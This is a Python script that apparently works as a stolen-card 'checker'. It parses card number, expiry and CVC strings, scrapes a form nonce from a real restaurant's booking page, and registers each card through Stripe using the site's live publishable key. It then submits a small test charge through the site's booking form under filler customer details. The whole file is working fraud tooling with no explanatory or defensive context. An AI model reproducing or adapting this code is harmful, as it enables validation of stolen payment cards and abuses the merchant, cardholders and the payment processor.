import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'couqley.ae',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://couqley.ae/group-booking/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://couqley.ae/group-booking/', headers=headers)
	
	__fluent_form_embded_post_id = re.search(r"name='__fluent_form_embded_post_id' value='(.*?)'", response.text).group(1)
	_fluentform_7_fluentformnonce = re.search(r'name="_fluentform_7_fluentformnonce" value="(.*?)"', response.text).group(1)
	form_id = re.search(r'form data-form_id="(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fca98f11090%3B+stripe-js-v3%2Fca98f11090%3B+card-element&key=pk_live_51Mt7dzJqVFarYYzkkoB1jYzy4Ww7asPvFDmExt6qaF0JMR0zSKnT9dFWvsr9gh7SJC5k8cPRuygTHlhy2rXYu7tD00TryATqUc'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'couqley.ae',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://couqley.ae',
	    'referer': 'https://couqley.ae/group-booking/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1746301908304',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id={__fluent_form_embded_post_id}&_fluentform_7_fluentformnonce={_fluentform_7_fluentformnonce}&_wp_http_referer=%2Fgroup-booking%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&phone=4303000850&dropdown_1=Birthday%20Celebration&dropdown=Couqley&no_of_people=12&datetime=31%2F05%2F2025%2012%3A00%20PM&food_package=179&drinks_package=0&payment_options=Free%20Cancellation%202%20weeks&grand_total=2148&grand_total_1=179&custom-payment-amount_1=2.00&payment_method=stripe&food_canape%5B%5D=&checkbox%5B%5D=&food_coffee%5B%5D=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': f'{form_id}',
	}
	
	response = requests.post('https://couqley.ae/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)

	return (response.text)
